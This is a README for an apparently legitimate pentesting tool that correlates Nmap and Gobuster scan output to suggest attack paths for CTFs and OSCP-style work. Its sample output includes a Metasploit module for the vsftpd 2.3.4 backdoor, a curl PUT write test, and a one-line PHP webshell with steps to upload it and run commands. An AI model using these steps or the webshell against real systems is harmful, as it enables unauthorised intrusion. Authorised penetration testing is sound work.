# Pathfinder

**Intelligent Reconnaissance Analysis and Attack Path Suggestion for Pentesters.**

## Overview

Pathfinder is a command-line tool designed to act as an intelligent assistant during the reconnaissance and exploitation phases of penetration testing. It helps answer the critical question: **"What am I missing here...?"**

Instead of manually correlating findings from various scanning tools (like Nmap, Gobuster), Pathfinder parses their output, applies a ruleset based on common offensive security patterns and known vulnerabilities, and attempts to synthesise potential attack paths. It prioritises findings based on exploitability and impact, helping testers focus their efforts, especially in time-constrained scenarios like CTFs or OSCP-style exams.

## The Problem

Manual analysis of scan data is time-consuming and prone to human error. Key connections between disparate findings might be missed:
*   A specific service version vulnerable to a known exploit.
*   Default credentials working on an overlooked service.
*   A combination of findings (e.g., file upload capability + writable web directory + known web root) enabling a specific attack.
*   Information leaks pointing towards technologies vulnerable elsewhere.

## The Solution

Pathfinder aims to:

*   **Automate Analysis:** Ingest data from common recon tools.
*   **Correlate Findings:** Link information like service versions, open ports, discovered files/directories, and potential vulnerabilities.
*   **Suggest Attack Paths:** Move beyond simple vulnerability listing to suggest multi-step possibilities or specific exploitation techniques based on combined evidence.
*   **Prioritise:** Use a heuristic scoring system to highlight the most promising leads.
*   **Provide Context:** Optionally explain *why* a suggestion is being made.
*   **Integrate:** Suggest relevant Metasploit modules or `searchsploit` queries.

## Key Features

*   **Multi-Input Parsing:** Supports parsing output from popular tools (initially Nmap XML, planning for Nessus, Gobuster/Dirb, etc.).
*   **Vulnerability Mapping:** Correlates identified services/versions with known CVEs and public exploits (leveraging offline databases like Exploit-DB and online web-crawling for public Github exploits).
*   **Misconfiguration Checks:** Identifies common low-hanging fruit (default creds, anonymous access, risky configurations).
*   **Attack Path Synthesis:** Uses a rule-based engine and finding correlation to suggest potential exploitation chains (e.g., "Found FTP write access to webroot, suggest uploading shell").
*   **Heuristic Scoring:** Prioritises findings based on exploitability, impact, reliability, and OSCP relevance.
*   **Configurable Verbosity:** Control the level of detail in the output, from concise summaries to detailed explanations and commands.
*   **Metasploit Integration:** Suggests relevant `msfconsole` modules and commands.
*   **Cross-Platform:** Built with Python for broad compatibility.

## Example Workflow

```bash
# 1. Initialise a project directory (optional, helps organise)
pathfinder init my_target_project
cd my_target_project

# 2. Run your standard reconnaissance scans
nmap -sV -sC -oX nmap_results.xml 10.10.10.123
gobuster dir -u http://10.10.10.123 -w /path/to/wordlist.txt -o gobuster_results.txt
# ... other scans ...

# 3. Run Pathfinder analysis
pathfinder analyse nmap_results.xml gobuster_results.txt

# --- Sample Output ---
[*] Analysing inputs: nmap_results.xml, gobuster_results.txt
[*] Found 1 host: 10.10.10.123
[*] Correlating findings...

[*] Prioritised Findings for 10.10.10.123:
[1] [Score: 90] Port 21: vsftpd 2.3.4 - Potential Backdoor (Metasploit: exploit/unix/ftp/vsftpd_234_backdoor)
[2] [Score: 85] Port 80: Apache httpd 2.4.29 (Ubuntu) - Found /uploads directory (Writable? Check perms) + PHP detected. Possible shell upload?
[3] [Score: 70] Port 80: Found /config.php.bak - Potential credential leak. Investigate file content.
[4] [Score: 65] Port 22: OpenSSH 7.6p1 Ubuntu - Standard service. Check creds found elsewhere? (e.g., from config.php.bak)

[*] Run with -v for rationale, -vv for suggested commands/links.
# Get more detail on a specific finding
pathfinder analyse nmap_results.xml gobuster_results.txt -vv --host 10.10.10.123 --finding 2

# --- Sample Output ---
[*] Finding Details: [Score: 85] Port 80: Apache httpd 2.4.29 (Ubuntu) - Found /uploads directory (Writable? Check perms) + PHP detected. Possible shell upload?
[*] Rationale:
    - Nmap identified Apache 2.4.29 running PHP (via -sC or headers).
    - Gobuster found the '/uploads' directory (HTTP 200/301/403).
    - Attack Pattern Triggered: If a web server runs PHP and has a potentially accessible directory (especially named 'uploads'), file upload leading to RCE is a common vector.
[*] Suggested Actions:
    - Check directory permissions: curl -X PUT -d "test" http://10.10.10.123/uploads/test.txt (or use WebDAV tools if enabled)
    - Look for upload forms on the website.
    - If writable & PHP enabled: Try uploading a simple PHP webshell (e.g., <?php system($_GET['cmd']); ?>) to /uploads/shell.php and access http://10.10.10.123/uploads/shell.php?cmd=id
[*] References:
    - https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
